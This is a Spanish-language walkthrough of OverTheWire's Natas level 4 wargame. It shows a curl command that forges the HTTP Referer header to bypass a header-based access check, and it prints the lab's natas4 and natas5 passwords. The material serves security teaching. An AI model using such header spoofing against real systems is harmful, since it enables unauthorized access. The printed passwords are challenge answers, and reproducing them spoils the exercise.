# Natas Level04

## Descripción
> **Level Goal (natas4.natas.labs.overthewire.org):** "Acceso denegado. Solo usuarios que vengan desde `http://natas5.natas.labs.overthewire.org/` pueden usar esta página." La aplicación controla el acceso mirando el header HTTP `Referer`.

## Solución
El header `Referer` lo envía el cliente y no tiene ninguna garantía de integridad — un servidor no puede confiar en él para autenticar nada. Basta con forjarlo manualmente en la petición.

```bash
curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org/
# Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
```

## Notas adicionales
- Sin el header (petición "directa"), el servidor responde: `Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`, confirmando exactamente qué valor espera.
- Cualquier control de acceso basado únicamente en headers controlados por el cliente (`Referer`, `User-Agent`, `X-Forwarded-For`, cookies sin firmar) es trivialmente falsificable.

## Referencias
- Reto original: http://natas4.natas.labs.overthewire.org/
- Apoyo: https://curl.se/docs/manpage.html (opción `-H` para añadir headers arbitrarios)
